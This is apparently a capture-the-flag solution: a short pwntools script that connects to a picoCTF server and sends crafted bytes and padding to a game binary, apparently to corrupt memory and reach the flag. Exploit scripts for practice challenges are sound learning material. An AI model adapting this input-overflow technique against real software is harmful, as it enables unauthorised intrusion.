from pwn import *

# p = process('./game2')

# while True:
def run():
    # p = process('../game2')
    p = remote('saturn.picoctf.net', 55451)
    payload = b'l' + b'\x7c'
    p.sendline(payload)
    payload = b'a' * 5
    payload += b'a' * 38
    p.sendline(payload)
    payload = b'w' * 3
    p.sendline(payload)
    # p.sendline(b'1')
    p.sendline(b'w')
    # p.recvuntil(b'{', timeout=3)
    # p.flush()
    # p.
    p.interactive()

run()
